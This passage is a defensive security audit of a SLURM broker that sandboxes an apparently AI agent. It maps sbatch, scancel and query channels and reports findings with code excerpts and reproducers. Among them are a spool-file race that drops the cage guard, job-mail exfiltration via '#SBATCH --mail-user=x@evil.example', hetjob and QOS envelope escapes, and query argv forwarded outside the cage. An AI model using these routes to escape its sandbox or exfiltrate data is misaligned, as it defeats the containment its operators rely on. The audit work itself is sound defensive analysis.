# B6 — the SINK × channel matrix, extended and re-verified

**Pass 1 (discovery). Code-only, laptop, no cluster.** Nothing was modified. Sources read:
`slurm-broker/THREAT-MODEL.md`, `broker/src/{policy,sbatch,srun,spool,step,rank,session,
profile,settings,protocol,lib,main}.rs`, `sbatch-stub.py`, `selftest.sh`,
`directive-parity-probe.sh`, `BROKER.md`, `PROTOCOL.md`, `bringup-balfrin-ln003.txt`
(86/86 PASS, 2026-08-02), `broker/tests/golden/guard-net-{on,off}.sh`.

## Summary

The eight existing rows are all still correct *as far as they go*, and the two changes since
the matrix was drawn are both fine: the multi-partition list is **stronger** than "force
exact partition" describes (husk re-emits its own allowlist entry, never the request's
bytes, and refuses `a,b`), and `scancel` needs **its own small matrix** rather than a row,
because its channels are of a different kind. But the matrix is **not closed**. It is missing
one whole *verb* (the read-only query path, which forwards raw agent argv into another
SLURM binary), one whole *field* (`job_args`, appended unvalidated to the real sbatch argv),
and at least six *decisions* — mail, het-job structure, QOS, reservation, array size,
dependency/hold — of which two are live holes. Most seriously, the row that matters most
("what code runs") is missing the channel that its own control creates: the staged guard
script is written into the **agent-writable spool** and then handed to `sbatch` **by path**,
which contradicts BROKER.md's and PROTOCOL.md's explicit claim that it is "a
broker-controlled path … never a path the agent can rewrite between validation and slurmd
reading it". Structurally, the finding that generalises all of it is that the
`Forced/Allowed/Ignored/Rejected` taxonomy is a **CLI-only taxonomy**: `body_reject_reason`
knows only three states (reject / dominated / accept), so `Ignored` in a `#SBATCH` line
means *forwarded to slurmd with nothing overriding it*, and any `#SBATCH` token that does
not begin with `-` is skipped entirely and never gated at all.

---

## THE EXTENDED MATRIX

Legend — **Dominates?**: `YES` = the control wins whatever the agent does on any listed
channel; `PARTIAL` = wins on some channels only; `NO` = a channel is ungated.
**Proven?**: `T` unit test, `S` selftest arm, `H` hardware run, `G` golden argv/script,
`—` nothing demonstrates it.

### Verb 1 — `sbatch` (submission). Sink: slurmctld / slurmd / slurmstepd.

| # | slurmd decision | channels that can set it | husk's control | Dominates? | Proven? — evidence |
|---|---|---|---|---|---|
| 1 | **what code runs** | script file · `--wrap` · stdin · `#SBATCH` before first exec line | stub snapshots all three into `body`; `--wrap` `Forced`→dropped; guard injected after head, before first command | YES for these three | **T** `strips_wrap_equals_form_…`, `strips_wrap_separated_form_…`, `wrap_script_orders_directives_then_guard_then_body`; **S/H** `sbatch.wrap_stripped`, `wrap.caged` |
| 1a | **what code runs** — *(new channel)* **the staged file `<spool>/job-<id>.sh`, between `write_atomic` and `sbatch`'s `open()`** | the agent writes the spool by design (`lib.rs:38-52`); `id` is agent-chosen and known to it | none — `spool.rs:172-180` writes the script then passes its **path** to sbatch | **NO** | **—** *(nothing tests it; docs assert the opposite)* → **F1** |
| 1b | **what code runs** — *(new channel)* `job_args` | `req.job_args`, appended raw after the script path (`spool.rs:180`) | none — `policy.rs:375` clones it verbatim | **NO** (rests on an unstated assumption about sbatch's getopt permutation) | **—** every test and every selftest arm sends `job_args: []` (`selftest.sh:152`) → **F2** |
| 2 | **stdout/stderr path** | `-o/-e` (4 spellings) · `#SBATCH` · `SBATCH_OUTPUT/ERROR` · `%` specifiers expanded by slurmd | husk always EMITS `--output/--error`; glued shorts split first (F13); value confined by `confine_output_pattern` (canonicalised, symlinks resolved, `%x` excluded) | YES | **T** `output_paths_that_escape_the_workdir_are_refused`, `the_job_name_specifier_is_not_allowed_in_an_output_path`, `a_specifier_in_a_directory_component_is_refused…`; **S/H** `sbatch.force_safe`, `sbatch.output_confined`, `sbatch.body_confined`, `sbatch.body_logpath`. **Env sub-cell: `T`/`S` = none** — the channel is severed because `req.env` is *never read* except for 3 uenv keys, not because anything strips it (the matrix says "env stripped"; that is inaccurate, see **F8**) |
| 2a | **stdout/stderr path** — post-submit symlink swap | agent pre-creates `slurm-<jobid>.out` as a symlink in the workdir | none; **documented and accepted** (BROKER.md:198-206) | NO, by decision | **—** (accepted residual, correctly disclosed) |
| 3 | **working dir (job)** | `-D/--chdir` · `#SBATCH` · `SBATCH_CHDIR` · `req.cwd` | emit `--chdir`; `is_workdir_allowed(req.cwd)` **and** `confine_under_any(.., writable set)`; the write root is the **trusted project dir**, not `req.cwd` | YES | **T** `a_chdir_outside_the_workdir_is_refused`, `an_agent_chosen_cwd_cannot_place_job_output_outside_the_writable_set`, `the_cage_does_not_narrow_when_the_agent_cds_before_submitting`, `a_job_may_be_submitted_from_any_declared_writable_dir_but_no_other`; **S/H** `sbatch.chdir_confined` |
| 4 | **partition** *(row updated: now one-of-a-set)* | `-p` (4 spellings) · `#SBATCH` · `SBATCH_PARTITION` | require; resolve against `session.allowed_partitions`; **re-emit husk's own entry**; `a,b` refused; operator list itself charset-filtered (`session.rs:28-39`) | YES — strictly stronger than "force exact partition" | **T** `a_job_may_choose_any_allowed_partition_and_nothing_else`, `rejects_glued_short_partition`; **S/H** `sbatch.partition_list`, `sbatch.wrong_partition`, `sbatch.directive_partition` |
| 4a | partition — *the resource-envelope guarantee* | the operator's list | none: nothing checks any member is preemptible; with a list the guarantee is that of the **weakest member** | n/a (operator) | **—** THREAT-MODEL §"resource envelope" still assumes ONE partition → **F7** |
| 5 | **account (who is billed)** | `-A/--account` · `#SBATCH` · `SBATCH_ACCOUNT` | `Class::Forced` (`sbatch.rs:160`); emitted from `HUSK_SLURM_ACCOUNT`; agent request with no config → refuse + teach | YES | **T** `the_account_is_forced_from_operator_config_and_never_the_agents` |
| 5a | account — operator value grammar | `HUSK_SLURM_ACCOUNT` | **none** (`session.rs:145` is a bare `nonempty()`), unlike partitions | n/a | **—** minor asymmetry → **F9** |
| 6 | **QOS** *(split out of row "partition/account/qos")* | `-q/--qos` · `#SBATCH` · `SBATCH_QOS` | **`Class::Allowed`**, `v_name` only (`sbatch.rs:154`) — agent chooses | **NO — the matrix row claims "forced value wins" and that is false for qos** | **—** no test, no arm; verified by probe: `interpret_cli(["--qos=highprio"]) → ["--qos=highprio"]` → **F5** |
| 7 | **reservation** *(new row)* | `--reservation` · `#SBATCH` | `Class::Allowed`, `v_name` (`sbatch.rs:161`) | NO | **—** → **F5** |
| 8 | **uenv/repo mount** (root, via slurmstepd) | `--uenv/--view/--repo` · `#SBATCH` · `SBATCH_UENV*` | strip CLI (all `Forced`); **reject** any body/env selection differing from the session, or naming `--repo` | YES on CLI+body | **T** `rejects_agent_uenv_mismatch`, `rejects_agent_repo`, `rejects_body_uenv_when_no_session_uenv`. **The `SBATCH_UENV*` env sub-cell is UNPROVEN**: `policy.rs:170-174` reads it, but no test or arm anywhere sets `req.env` → **F10** |
| 9 | **inherited env** | `--export` · `#SBATCH` · `SBATCH_EXPORT` · the broker's own env | force `--export=ALL` on CLI unconditionally (F24); `STRIPPED_SUBMIT_ENV` removes 4 vars from the sbatch child | YES | **T** `forced_cli_dominates_body_export_f24`, `model_credentials_are_stripped_from_the_submission`; **S/H** `sbatch.body_export`, `sbatch.force_safe` |
| 10 | **node/resource shape** | `--nodes/--ntasks/--time/--mem/--gpus/--gres/--constraint/--nodelist/--exclude/--distribution/--hint/pinning` · `#SBATCH` | `interpret_cli`: parse → per-option grammar → **re-emit canonically**; unknown ⇒ reject; `--nodes` is `Forced` and `--nodes=1` emitted unconditionally | YES (shape; magnitude delegated by decision) | **T** `interpret_cli_*`, `no_allowed_value_grammar_accepts_injection_chars`, `single_node_is_forced_not_merely_permitted`; **S/H** `sbatch.canonicalize`, `sbatch.nodes_forced`, `sbatch.multinode`, `sbatch.bad_value` |
| 11 | **how many jobs exist (arrays)** *(new row)* | `-a/--array` · `#SBATCH` | `Class::Allowed`, `v_array` charset only — `1-100000` accepted by design | NO (deliberate: magnitude → partition/QOS) | **—** no test; interacts with row 6 (an agent-chosen QOS moves the bound that is supposed to hold it) → **F5** |
| 12 | **when / whether the job runs** *(new row)* | `--dependency` · `--begin` · `--deadline` · `--hold` · `--requeue/--no-requeue` · `#SBATCH` | all `Class::Allowed`, charset grammars | NO (no containment content identified) | **—** |
| 13 | **which signal, to whom, when** *(new row)* | `--signal` · `#SBATCH` | `Class::Allowed`, `v_signal` (`sbatch.rs:164`) | NO | **—** Reasoned-through, not tested: `B:`-prefixed early SIGTERM cannot fire the guard's cleanup early, because bash defers a trap until the foreground command (`bwrap`) returns. **Worth one arm.** |
| 14 | **who is told, over SMTP, from outside the cage** *(new row)* | `--mail-type`/`--mail-user` on CLI · **`#SBATCH`** | CLI: `Class::Ignored` ⇒ dropped. **Body: accepted and forwarded; husk emits nothing to override it** | **NO** | **—** probe-confirmed: `body_reject_reason("#SBATCH --mail-user=…") → ACCEPTED` → **F3** |
| 15 | **het-job structure — how many components, each with its own partition/nodes/account/output** *(new row)* | `#SBATCH hetjob` / `#SBATCH packjob` in the body | **none**: `body_reject_reason` skips every token not starting with `-` (`sbatch.rs:408-411`) | **NO** | **—** probe-confirmed accepted; the parity probe varies only the `#SBATCH` *prefix*, never the token after it → **F4** |
| 16 | **the default-deny family** *(new row)* — `--licenses`, `--container`, `--bb/--bbf`, `#BB`/`#DW`, `--clusters/-M`, `--input`, `--open-mode`, `--propagate`, `--nice`, `--get-user-env`, `--prolog`, `--extra-node-info`, `--wckey`, `--test-only` | CLI · `#SBATCH` | absent from `REGISTRY` ⇒ rejected on both channels; `#BB`/`#DW` rejected by an explicit line scan | YES | **T** `interpret_cli_rejects_unknown_options`, `body_reject_reason_flags_forced_and_unknown_and_burst_buffer`; **S/H** `sbatch.unknown_option`, `sbatch.body_unknown`, `sbatch.body_burstbuffer`; probe re-confirmed 8 more spellings |
| 17 | **which `#SBATCH` spelling slurmd honours at all** | 12 spellings (case, leading space/tab, glued, after-code, CRLF, BOM) | husk's parser is deliberately *wider* than slurmd's (over-reject direction) | YES *at these sites* | **H** `sbatch.directive_parity` PASS, Balfrin ln003 line 95; `directive-parity-probe.sh`. **Site- and version-scoped, and it does not cover row 15's token grammar** |
| 18 | **identity** | — | runs as you; MUNGE; `--uid/--gid` root-only and absent from the registry | YES | **H** `cred.munge`, `probe.submit` |

### Verb 2 — `scancel`. Sink: slurmctld. *(This wants its own matrix, not a row: its decision is over data, not options.)*

| # | decision | channels | control | Dominates? | Proven? |
|---|---|---|---|---|---|
| S1 | **which jobs die — by id** | the argument list | grammar `<digits>[_<digits>|.<digits>]`, ≤20 digits (`policy.rs:509-516`), then **provenance**: `cancel_base_id ∈ Broker.submitted` (`spool.rs:224-243`); all-or-nothing | YES | **T** `scancel_takes_job_ids_and_refuses_every_selector`, `scancel_refuses_a_job_this_session_did_not_submit`; **S/H** `scancel.sc_own`, `scancel.not_an_id` |
| S2 | **which jobs die — by selector** | `-u/--me/--state/--account/--partition/--name/--qos/--nodelist`, and any future selector | default-deny: **any** argument starting with `-` refused | YES | **T** as above (10 spellings); **S/H** `scancel.sc_sel`, `scancel.sc_me`, `scancel.sc_state` |
| S3 | **which jobs die — via `SCANCEL_*` env** *(new cell — unlisted channel)* | `SCANCEL_USER`, `SCANCEL_STATE`, `SCANCEL_ACCOUNT`, `SCANCEL_PARTITION`, `SCANCEL_NAME`, `SCANCEL_QOS`, `SCANCEL_CTLD`, `SCANCEL_FULL`, … (scancel(1)) | **none.** `run_query_cmd` (`spool.rs:307-324`) inherits the broker's environment; only `run_sbatch` calls `env_remove` | **NO** (low severity today: that env is the human's login env, not the agent's) | **—** → **F6** |
| S4 | **the ownership set's own lifetime** | broker restart | in-memory, per session; a restart disowns earlier jobs (fails toward refusal) | YES | **T** (documented + covered by S1's test) |
| S5 | **cancel of an owned job actually working** | — | — | — | **T** only (`scancel_refuses_…` positive half, dry-run). **No hardware arm submits a job and then cancels it**; all four hardware `scancel.*` arms are negative |

### Verb 3 — read-only queries (`squeue sinfo sacct sstat sprio sreport sshare`). *(No row exists at all.)*

| # | decision | channels | control | Dominates? | Proven? |
|---|---|---|---|---|---|
| Q1 | **what SLURM state is disclosed, and what file is read** | **the entire agent argv, forwarded verbatim** — `policy.rs:79-83` `argv.extend(req.argv.iter().cloned())` | the **command name** only (`READONLY_SLURM`), + 60 s timeout + 1 MiB output cap | **NO** — this is the one place husk deliberately forwards adversary bytes into another SLURM binary's parser | **S/H** `squeue.routed` proves routing, nothing proves the *option surface* is harmless → **F11** |

### Verb 4 — `srun` steps (step-broker). *Overlap with the step-allowlist surface; listed for closure, not chased.*

| # | decision | channels | control | Dominates? | Proven? |
|---|---|---|---|---|---|
| R1 | what code runs in a step | trailing positional | not vetted — **wrapped**: `srun … -- seccomp-wrapper bwrap <rank cage> -- <cmd>` | YES | **T** `srun.rs` tests; **S/H** `steps.launch`, `steps.cage`, `steps.multirank` |
| R2 | options that run code outside the wrap | `--task-prolog/--task-epilog/--prolog/--epilog/--multi-prog/--bcast/--pty/--export/--get-user-env` | `Class::Rejected` with a reason | YES | **T** `rejects_options_that_run_code_outside_the_wrap`; **S/H** `steps.allowlist` |
| R3 | step working directory | `req.cwd` of the step request | `is_workdir_allowed` **only** (`step.rs:278-288`) — *not* `confine_under_any`, unlike the job's `--chdir` | PARTIAL | **T** `a_steps_working_directory_gets_the_same_check_as_a_jobs`. The asymmetry is deliberate (the rank cage's writable root is `self.workdir`) but the row should record that the two `--chdir`s have different controls |
| R4 | step environment | `req.env` → `--setenv` on the rank cage | name grammar + `RESERVED_ENV_PREFIXES` + `PROXY_ENV` + deny list + 512 cap | YES | **T** `scheduler_owned_names_are_never_forwarded`, `a_forwarded_variable_cannot_undo_credential_masking`; **S/H** `steps.env` |
| R5 | step stdout/stderr | `--output/--error` | `Class::Forced` → dropped; step-broker supplies `Stdio::from(File)` in the spool | YES | **T** `drops_broker_owned_options_instead_of_forwarding_them` |

---

## Findings, most severe first

### F1 — The staged guard script is handed to `sbatch` **by path**, in a directory the agent can write. `PLAUSIBLE` (race), and the docs-vs-code contradiction is `CONFIRMED`.

`slurm-broker/broker/src/spool.rs:171-181`

```rust
let script_path = self.spool.join(format!("job-{id}.sh"));
if let Err(e) = write_atomic(&script_path, sub.wrapped_script.as_bytes()) { … }
let mut argv: Vec<String> = vec!["sbatch".to_string(), "--parsable".to_string()];
…
argv.push(script_path.to_string_lossy().to_string());
```

The spool **must** be agent-writable — `lib.rs:38-42` says so explicitly ("so it MUST live
somewhere the agent can write … Everything in here is agent-writable, so nothing in here is
evidence"). `id` is agent-chosen (it is `req.id`, validated only as a safe path component).
So between `write_atomic`'s `rename` and `sbatch`'s `open()` of that path, the agent can
`rename()` its own file over `job-<id>.sh`. What sbatch then copies into SLURM's spool is
the agent's script **without the re-exec guard** — i.e. no bwrap, no seccomp-wrapper, no
`--unshare-net`, no `/run/munge` mask. That is a total compute-side cage bypass and it
reopens AV8.

The pre-plant variant is already closed and fails closed correctly: `write_atomic` opens the
tmp path with `create_new|O_NOFOLLOW`, so a pre-planted `.job-<id>.sh.tmp` aborts the
submission (`spool.rs:444-464`, `write_atomic_refuses_a_planted_symlink_at_the_tmp_path`).
Only the **post-rename** window is open, and nothing narrows it: the fsync happens *before*
the rename, and `run_sbatch` then does a full fork+exec+dynamic-link+`slurm.conf` parse
before reading the file.

This directly contradicts two documents:

- `BROKER.md:214-218` — "The broker writes that immutable snapshot to a
  **broker-controlled path** and submits *that* — never a path the agent can rewrite between
  validation and slurmd reading it."
- `PROTOCOL.md:196-199` — "The broker submits *this snapshot*, never a path the agent could
  rewrite between validation and slurmd reading it (TOCTOU)."

The project already reasoned about exactly this shape one line of code away
(`BROKER.md:198-206`, the `--output` symlink-swap residual, "same TOCTOU shape as F20") and
did not apply it to the script. THREAT-MODEL rule 4 — *capture values, not references* — is
the rule being broken: the body was captured, and then turned back into a reference.

**Reproducer for triage** (laptop, no cluster): put a fake `sbatch` on `PATH` that `sleep
0.05`s then `cat`s its script argument and prints `1`; run the broker against a spool; from
a second process spin `ln`/`rename` a marker file onto `<spool>/job-<id>.sh` for a known id.
If the fake sbatch ever prints the marker instead of the guard, the race is won. Then repeat
with the sleep removed to measure the real window.

**Fix shape (for the coordinator, not this pass):** hand sbatch the script on **stdin**
(sbatch reads the script from stdin when given no script positional — the stub already
relies on this in reverse), or stage into a directory the agent cannot write (`~/.husk/`,
which is already outside the cage and already holds the job log for exactly this reason),
or `open()` the file and pass `/proc/self/fd/N`.

---

### F2 — `job_args` is raw agent bytes appended to the real `sbatch` argv. `CONFIRMED` (the forwarding), `PLAUSIBLE` (that sbatch parses them as options).

`slurm-broker/broker/src/policy.rs:375` (`job_args: req.job_args.clone()`) →
`slurm-broker/broker/src/spool.rs:177-181`:

```rust
argv.push(script_path.to_string_lossy().to_string());
argv.extend(sub.job_args);
```

`job_args` passes through **no validation of any kind** — no grammar, no length bound, no
count bound, no `-` check. `policy.rs:341-342` claims "No raw agent token reaches slurmd",
and THREAT-MODEL says "The broker no longer forwards adversary bytes into slurmd's parser."
Both are false for this field.

Whether it is exploitable turns on one unstated assumption: that SLURM's `sbatch` stops
option parsing at the first positional. GNU `getopt_long` **permutes by default** unless the
optstring begins with `+` or `POSIXLY_CORRECT` is set. Nothing in this repo states which
sbatch does, no probe measures it, and no test exercises the field — every unit test and
every selftest arm sends `job_args: []` (`selftest.sh:152`, `policy.rs:1005`,
`spool.rs:548/600`). A control that rests on an unmeasured property of a second parser is
exactly the F13/F14 shape.

Also note the agent need not go through the stub: it writes the spool directly, so the
stub's "job_args are only the tokens after the script" property is not a control either. A
hand-written request can put `["--partition=normal", "--qos=x", "--nodes=64"]` in `job_args`
with any `argv`.

**Reproducer for triage:** on a login node, outside husk, run
`sbatch --partition=<forced> /tmp/hello.sh --job-name=CANARY --hold --parsable` and read
`scontrol show job` — if `JobName=CANARY`, permutation is on and this is CONFIRMED as an
ungated channel for every non-Forced option. (`--hold` keeps it from allocating.) This is one
line to add to `directive-parity-probe.sh`.

---

### F3 — Mail is an ungated egress channel out of the cage, via `#SBATCH`. `CONFIRMED` (gate gap), `PLAUSIBLE` (impact, depends on site `MailProg`).

`slurm-broker/broker/src/sbatch.rs:184-185` (`--mail-type`/`--mail-user` = `Class::Ignored`)
and `sbatch.rs:428-462` (`body_reject_reason`).

`Ignored` means "dropped from the CLI". It does **not** mean dominated. In a `#SBATCH` line
the option is neither rejected (it is in the registry) nor overridden (husk emits no
`--mail-type`), so it is submitted verbatim and slurmctld honours it. Verified by compiling
the real `sbatch.rs` and calling it:

```
ACCEPTED  mail-user (Ignored class)   body="#SBATCH --mail-user=x@evil.example\n"
ACCEPTED  mail-type (Ignored class)   body="#SBATCH --mail-type=ALL\n"
```

Why it matters: the mail is composed and sent by **slurmctld**, on the control host, over
SMTP — outside the cage, outside `--unshare-net`, and outside husk's egress proxy and its
allowlist. The subject line carries `Name=<job name>`, and `--job-name` is agent-chosen with
64 bytes of `[A-Za-z0-9._+-]` (`v_name`). That is a low-bandwidth but real exfiltration
channel from a job husk deliberately gave no network, and `--mail-type=ARRAY_TASKS` with
`--array` (also `Allowed`, up to `1-100000`) multiplies the message count.

It also violates teaching-message property 1/2: on the CLI the option is dropped **silently**
while in the body it works, so the agent gets two different behaviours for one intent and no
message about either.

**Smallest fix:** move `--mail-type`/`--mail-user` from `Ignored` to `Rejected("husk does not
forward job mail; the cluster would send it from outside the sandbox")`, or emit
`--mail-type=NONE` on the CLI to dominate. The second is cheaper and keeps run scripts working.

---

### F4 — `#SBATCH hetjob` is invisible to the body gate; the whole matrix is per-component and husk forces only component 0. `CONFIRMED` (parser gap), `PLAUSIBLE` (het semantics).

`slurm-broker/broker/src/sbatch.rs:406-411`:

```rust
let tok = &directives[i];
if !tok.starts_with('-') {
    i += 1;
    continue;          // <-- every non-option token is skipped, un-gated
}
```

`sbatch_directives` collects **all** whitespace-separated tokens from `#SBATCH` lines, and
`body_reject_reason` then examines only those starting with `-`. A `#SBATCH` line that is a
**directive keyword rather than an option** is therefore never seen. Verified:

```
ACCEPTED  hetjob keyword      body="#SBATCH hetjob\n"
ACCEPTED  packjob keyword     body="#SBATCH packjob\n"
ACCEPTED  het via two components
          body="…#SBATCH --partition=preemptible\n#SBATCH hetjob\n#SBATCH --partition=normal\n#SBATCH --nodes=64\n…"
```

If this site's sbatch honours `#SBATCH hetjob` (it is the documented script spelling for a
heterogeneous job), the submission becomes a multi-component job: component 0 gets husk's
forced command line, and **each further component gets only its own `#SBATCH` block** — its
own partition, node count, time and account, none of which husk forced, validated or even
looked at. That is the resource-envelope control (row 4a) removed outright: a second
component can sit on a non-preemptible partition holding 64 nodes for the wall limit. The
batch script still runs only on component 0, so the cage is intact — this is an envelope
escape, not a containment escape, which on a shared cluster is the threat model.

The existing parity probe does **not** cover this: it varies the `#SBATCH` *prefix* across
12 spellings and always follows it with `--job-name=<canary>`. It has no variant whose token
is not an option. `directive-parity-probe.sh`'s own header even names `hetjob` in the list of
options "the body is the ONLY channel" for, and then does not test it.

**Reproducer for triage:** submit through husk a body containing `#SBATCH hetjob` followed by
`#SBATCH --partition=<a non-allowed partition>`, `--hold`, and check `scontrol show job` for
`HetJobId`/`HetJobOffset` and the second component's partition. Cancel immediately.

**Smallest fix:** in `body_reject_reason`, reject any `#SBATCH` token that is neither an
option nor the value of a preceding value-taking option — i.e. turn the silent `continue`
into a refusal. That closes `hetjob`, `packjob` and anything SLURM adds next.

---

### F5 — `--qos` and `--reservation` are `Allowed`, but the matrix row claims the family is forced; both move the resource envelope the partition is supposed to bound. `CONFIRMED`.

`slurm-broker/broker/src/sbatch.rs:154` (`--qos`, `Class::Allowed`, `v_name`) and
`sbatch.rs:161` (`--reservation`, `Class::Allowed`, `v_name`), against
`THREAT-MODEL.md:321`:

| **partition/account/qos** | … | require+force exact partition; glued split (F14) | forced value wins; mismatch rejected |

The row lumps three decisions under one control that only two of them have. `--partition` is
`Forced` and re-emitted; `--account` became `Forced` (`sbatch.rs:160`); `--qos` is
agent-chosen and re-emitted verbatim-after-grammar-check, on both the CLI and (accepted) in
the body. There is no test and no selftest arm for `--qos` or `--reservation` anywhere.

This is not cosmetic, because of THREAT-MODEL.md:370-375: the documented reason resource
*magnitude* is not checked is that "magnitude is bounded by the site's own QOS and by
preemption". Both bounds are selectable here. A QOS is exactly the object that carries
priority, `MaxWall`, `GrpTRES`, and `PreemptMode`/`PreemptExemptTime` — so an agent that
names a QOS its human happens to be entitled to can raise the ceiling the paragraph relies
on, or make the job non-preemptible, which is the *entire* resource-envelope control. A
reservation does the same by putting the job on nodes nothing else contends for.

The mitigating fact is the same one that makes `scancel` interesting: sacctmgr/reservation
ACLs are per-user, so the agent can only reach what its human can. That is an argument for
*documenting the row honestly*, not for the row as written. Recommended: either force
`--qos` from operator config the way `--account` now is, or split the row into
`partition (Forced) | account (Forced) | qos, reservation (Allowed — the envelope is the
human's entitlement, not husk's)` and say so in "The resource envelope".

---

### F6 — `scancel` (and every read-only query) runs with the broker's environment unfiltered; `SCANCEL_*` is an unlisted channel for the same decision. `CONFIRMED` (unlisted channel), severity LOW today.

`slurm-broker/broker/src/spool.rs:246-264` builds `["scancel", …ids]` and runs it through
`run_query_cmd` (`spool.rs:307-324`), which is a plain `Command::new` with **no
`env_remove`**. Only `run_sbatch` (`spool.rs:398-404`) strips anything, and only
`STRIPPED_SUBMIT_ENV`'s four names.

`scancel(1)` reads `SCANCEL_ACCOUNT`, `SCANCEL_NAME`, `SCANCEL_PARTITION`, `SCANCEL_QOS`,
`SCANCEL_STATE`, `SCANCEL_USER`, `SCANCEL_CTLD`, `SCANCEL_FULL`, `SCANCEL_HURRY`,
`SCANCEL_BATCH` — the exact selector family that `cancel_decision`'s default-deny on `-`
exists to refuse. Today the agent cannot set them (the broker's env is the pre-agent login
env), so this is not an escape; it is a **channel the scancel section of THREAT-MODEL does
not list at all**, while the sbatch rows list `SBATCH_*` for every decision they cover. The
asymmetry is the finding: the provenance gate is described as if the argument list were the
only channel, and it is not.

Same shape, no teeth: `SQUEUE_*`/`SACCT_*` on the query path.

**Smallest fix:** one `env_remove` loop over a `SCANCEL_*`/`SQUEUE_*` prefix strip in
`run_query_cmd`, plus a line in the scancel section listing env as a channel.

---

### F7 — The resource-envelope guarantee is written for one partition and the code now takes a list; nothing checks the weakest member. `CONFIRMED` (docs-vs-code), operator-facing.

`THREAT-MODEL.md:366-397` — "Every brokered job is required to request, and is forced onto,
**a single partition** … Choose a **preemptible** one and the property is structural" — and
`session.rs:28-39`/`policy.rs:113-147`, which take `HUSK_SLURM_PARTITION` as a
comma-separated **set**. With a set, the structural guarantee is only as strong as its
weakest member, and nothing in husk can tell. The section's operator table ("you are… /
choose…") still reads as a single choice.

This is live, not hypothetical: the hardware config on Balfrin is
`HUSK_SLURM_PARTITION=pp-short,short` (`bringup-balfrin-ln003.txt` lines 2-12), neither of
which is the preemptible partition the guarantee is written about. That is a legitimate
operator choice — the doc explicitly permits it — but the doc has not been updated to say
that the *set* multiplies the exposure, and `DEFAULT_PARTITION` being safe no longer implies
the configured value is.

---

### F8 — The stdout/stderr row says "env stripped"; nothing strips it. `CONFIRMED` (docs-vs-code), no exploit.

`THREAT-MODEL.md:319`. In fact `SBATCH_OUTPUT`/`SBATCH_ERROR` never reach sbatch because
`req.env` is **never read** on the submission path except for three uenv keys
(`policy.rs:170-174`), and `run_sbatch` inherits the broker's own (trusted) environment. The
real control is *severance by omission*, which is stronger than a strip — and also weaker in
one respect: nothing enforces it. There is no test asserting that `req.env` cannot influence
the emitted argv, so a future change that forwards `req.env` (e.g. to support a narrower
`--export`) would silently un-dominate rows 2, 3, 4, 5 and 9 at once. PROTOCOL.md:211 even
ships the attack in its example request (`"env": { "SBATCH_OUTPUT": "…/.bashrc" }`) with no
test behind it.

**Smallest fix:** one unit test that builds a `Request` with every `SBATCH_*` key set to a
poisoned value and asserts none of them appears in `Submission.options`.

---

### F9 — `HUSK_SLURM_ACCOUNT` has no value grammar, while `HUSK_SLURM_PARTITION` does. `CONFIRMED`, minor.

`session.rs:145` (`account: nonempty("HUSK_SLURM_ACCOUNT")`) vs `session.rs:28-39`
(`parse_partition_list`, which drops entries containing whitespace, `$`, `;`, or a leading
`-`, with the comment "even from operator config, because 'it is trusted' is how the last few
bugs got in"). The account is emitted as `format!("--account={acct}")`, one argv element, so
a hostile value cannot split into a second option — but the two operator inputs travel the
same path to the same parser and only one is filtered. Fix is four lines and removes the
asymmetry.

---

### F10 — The `SBATCH_UENV*` cell is named in the matrix and exercised by nothing. `CONFIRMED` (unproven cell).

`policy.rs:170-200` reads `req.env["SBATCH_UENV"]`, `["SBATCH_UENV_VIEW"]`,
`["SBATCH_UENV_REPO"]` and rejects on mismatch — this is the F26 fix's third channel. No unit
test sets `req.env` (`policy.rs:996-1008` hard-codes `BTreeMap::new()`), and every selftest
request ships `"env": {}` (`selftest.sh:152`). The uenv row is the one whose sink is a
**root-privileged squashfs mount by slurmstepd**, so it is the worst row to have an untested
channel in.

**Smallest fix:** three unit-test cases — env-only `--repo`, env-only `--uenv` mismatch, and
env-only `--uenv` with no session uenv — plus one selftest arm that sets `env` in `mkreq`.

---

### F11 — The read-only query verb has no row, and it forwards the agent's whole argv into another SLURM binary. `CONFIRMED` (unrowed + forwarded), `PLAUSIBLE` (disclosure impact).

`policy.rs:77-83`:

```rust
t if READONLY_SLURM.contains(&t) => {
    let mut argv = vec![req.tool.clone()];
    argv.extend(req.argv.iter().cloned());   // verbatim
    return Decision::Query(argv);
}
```

The gate is the **command name** and nothing else. These commands then run in the broker's
context — outside the cage, with MUNGE, with the network, and with the human's *full*
filesystem view, including `/users`, which the cage tmpfs-masks precisely so the agent cannot
see it. Up to 1 MiB of their stdout is returned into the cage.

Two concrete shapes worth triaging, both unproven:

- **`sacct --completion --file=<path>`** — `sacct` reads job-completion records from a
  caller-named file. Aimed at a path the *cage hides* (a home, an `.ssh` file), it is a
  read oracle that runs outside the cage; how much it echoes depends on the jobcomp parser's
  error handling.
- **`squeue --json` / `-o '%o %Z %o'` / `sacct --batch-script -j <id>`** — full job records
  for *every job this uid owns*, including the human's production runs husk never submitted:
  working directories, output paths, submit lines, and (with `--batch-script`) the scripts
  themselves. That is the same disclosure question A7 is asking about teaching messages,
  arriving through a channel A7 does not cover.

Everything else about the path is sound and should be recorded in the row as such: the 60 s
watchdog and process-group kill (`spool.rs:307-352`, `run_query_cmd_kills_a_hanging_command`)
close the `--iterate` DoS, and `cap_output` bounds the response.

---

### F12 — `#SBATCH --wait` is accepted in the body and `run_sbatch` has no timeout: a job-length broker wedge. `PLAUSIBLE`.

Same mechanism as F3. `sbatch.rs:176-181` classifies `--wait` as `Ignored` *specifically* to
stop it wedging the broker — "`--wait` makes sbatch block until the job COMPLETES, which
would wedge the single-threaded broker for the whole job runtime (the F2/F16 DoS shape)". That
reasoning covers the CLI only; probe output:

```
ACCEPTED  wait (Ignored class)   body="#SBATCH --wait\n"
```

and `run_sbatch` (`spool.rs:398-407`) is a bare `cmd.output()` — **no watchdog, no process
group, no timeout**, unlike `run_query_cmd` right above it, which was hardened for exactly
this class. If sbatch honours the directive, one submission with `--time=<partition max>`
blocks the broker's single-threaded loop for the whole wall limit: no further sbatch, no
squeue, and — the part that matters — **no `scancel`**, so the agent cannot even stop the job
that is wedging it, and neither can a human going through husk.

**Reproducer for triage:** outside husk, `sbatch --hold --parsable /tmp/hello.sh` with
`#SBATCH --wait` in the body and see whether sbatch returns immediately or blocks. If it
blocks, this is CONFIRMED. Fix: `Rejected` for `--wait` in the body path, *and* give
`run_sbatch` the same watchdog `run_query_cmd` already has (the second half is worth doing
regardless — a hung `sbatch` for any reason currently wedges the broker forever).

---

## The one structural finding underneath F3, F4 and F12

The registry taxonomy has four classes; `body_reject_reason` has three behaviours:

| registry class | CLI (`interpret_cli`) | body (`body_reject_reason`) | is the body dominated? |
|---|---|---|---|
